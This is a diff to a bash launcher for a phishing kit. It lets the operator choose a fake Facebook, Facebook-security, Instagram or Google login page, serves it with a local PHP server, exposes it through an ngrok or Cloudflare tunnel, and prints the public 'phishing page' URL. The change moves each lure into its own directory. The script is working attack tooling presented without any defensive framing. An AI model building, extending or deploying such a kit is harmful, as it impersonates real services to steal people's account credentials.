@@ -18,16 +18,16 @@ read -p "Enter your choice: " choice
 
 case $choice in
     1)
-        page="facebook.php"
+        page_dir="facebook"
         ;;
     2)
-        page="facebooksecurity.php"
+        page_dir="facebook_security"
         ;;
     3)
-        page="instagram.php"
+        page_dir="instagram"
         ;;
     4)
-        page="google.php"
+        page_dir="google"
         ;;
     *)
         echo "Invalid choice"
@@ -35,10 +35,10 @@ case $choice in
         ;;
 esac
 
-# Navigate to the pages directory
-cd pages || { echo "Error: Could not change directory to 'pages'"; exit 1; }
+# Navigate to the appropriate pages directory
+cd pages/"$page_dir" || { echo "Error: Could not change directory to 'pages/$page_dir'"; exit 1; }
 
-# Start PHP server and serve the selected page
+# Start PHP server and serve the index.php page
 php -S localhost:8080 & 
 php_server_pid=$!
 sleep 2
@@ -77,7 +77,7 @@ if [ "$tunnel_choice" -eq 2 ]; then
 
     # Output ngrok URL
     echo "Ngrok URL: $ngrok_url" | lolcat
-    echo "You can access the phishing page at: $ngrok_url/$page" | lolcat
+    echo "You can access the phishing page at: $ngrok_url/index.php" | lolcat
 elif [ "$tunnel_choice" -eq 1 ]; then
     # Install and start Cloudflared tunnel
     if ! command -v cloudflared &> /dev/null; then
@@ -103,7 +103,7 @@ elif [ "$tunnel_choice" -eq 1 ]; then
 
     # Output Cloudflare URL
     echo "Cloudflare URL: $cloudflare_url" | lolcat
-    echo "You can access the phishing page at: $cloudflare_url/$page" | lolcat
+    echo "You can access the phishing page at: $cloudflare_url/index.php" | lolcat
 fi
 
 # Trap for cleanup on exit
